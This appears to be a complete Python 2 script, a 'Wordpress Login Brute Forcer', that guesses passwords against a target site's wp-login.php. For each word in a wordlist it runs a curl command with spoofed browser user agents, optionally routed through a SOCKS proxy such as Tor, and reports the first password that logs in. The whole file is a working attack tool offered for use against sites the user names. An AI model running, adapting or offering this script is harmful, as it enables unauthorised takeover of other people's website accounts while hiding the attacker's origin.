#!/usr/bin/python

import os,sys,time,urllib2
os.system("rm wpbrute_output.html")
os.system("rm dir_list.txt")
os.system("clear")

try:
	target = sys.argv[1]
	username = sys.argv[2]
	wlist = sys.argv[3]

except:
	time.sleep(0.6)
	print "+_________________________________________+"
	print "|     Wordpress Login Brute Forcer        |"
	print "|         Created By Spoof.               |"
	print "+_________________________________________+\n"
	time.sleep(1)
	print "Usage : python wpbrute.py <target> <username> <wordlist> <proxy>\n"
	print "Example1 : python wpbrute.py http://www.mywebsite.com/ admin wordlist.txt"
	print "Example2 : python wpbrute.py http://www.mywebsite.com/ admin wordlist.txt '127.0.0.1:9050'\n"
	sys.exit(1)	

try:
	proxy = sys.argv[4]
except:
	proxy = "no"

if "http://" not in target:
	target = "http://%s" %target

print "+_________________________________________+"
print "|     Wordpress Login Brute Forcer        |"
print "|         Created By Spoof.               |"
print "+_________________________________________+"
time.sleep(1)
print "\n Calculating Number Of Words İn '%s' " %wlist
time.sleep(1.3)

words = open(sys.argv[3],"r").readlines()

time.sleep(0.8)

print "\n [+] Words Loaded => ", len(words) 
time.sleep(1.3)

if proxy != "no":
	print " [+] Proxy Loaded => '%s'\n" %proxy

else:
	print "\n"

time.sleep(1.1)
print " Bruteforcing Wordpress Login \n"
time.sleep(1.5)


for word in words:
        word = word.replace('\r','').replace('\n','')

	
	print " Trying => '%s : %s' " %(username,word) 

	if proxy != "no":
		curl = "curl -s --socks5 %s --url '%s/wp-login.php' -A 'Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1' --data 'log=%s&pwd=%s&wp-submit=Login&redirect_to=%s/wp-admin/&testcookie=1' -o wpbrute_output.html" %(proxy,target,username,word,target)
	
	else:
		curl = "curl -s --url '%s/wp-login.php' -A 'Mozilla/2.0 (compatible; MSIE 6.0; Windows NT 5.2)' --data 'log=%s&pwd=%s&wp-submit=Login&redirect_to=%s/wp-admin/&testcookie=1' -o wpbrute_output.html" %(target,username,word,target)

	ls = "ls -l > dir_list.txt"

	os.system(curl)
	os.system(ls)

	cfile = open("dir_list.txt","r")
	cfile_read = cfile.read()
	cfile.close()

	if "wpbrute_output.html" in cfile_read:
		#print "\n_________________________________________"
		#print " Login Not Bruteforced :( "
		ofile = open("wpbrute_output.html","r")
		ofile_read = ofile.read()
		ofile.close()
		os.system("rm wpbrute_output.html")

		if "Invalid username" in ofile_read or ("Nome de usu" in ofile_read and "inv" in ofile_read and "lido." in ofile_read) or "Nome utente non valido" in ofile_read:
			print ".. Invalid username!\n"
			sys.exit(1)
			#print "________________________________________\n"

	else:
		print "\n__________________________________________________________"
		print " Login Bruteforced --> '%s : %s'" %(username,word)
		print "__________________________________________________________\n"
		sys.exit(1)
